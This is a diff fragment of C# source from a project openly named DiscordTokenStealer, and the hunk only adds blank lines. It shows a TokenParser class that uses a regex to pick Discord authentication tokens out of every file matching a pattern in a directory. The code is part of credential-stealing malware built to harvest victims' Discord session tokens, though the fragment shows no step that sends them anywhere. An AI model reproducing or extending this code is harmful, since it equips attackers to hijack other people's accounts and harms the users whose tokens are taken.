@@ -2,9 +2,11 @@
 using System.Text.RegularExpressions;
 
 namespace DiscordTokenStealer.Discord;
+
 public static class TokenParser
 {
     private static readonly Regex TokenRegex = new Regex("((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
+
     private static IEnumerable<string> ParseFrom(string directory, string searchPattern)
     {
         return Directory.GetFiles(directory, searchPattern).SelectMany(fileName => ParseTokens(File.ReadAllText(fileName)));
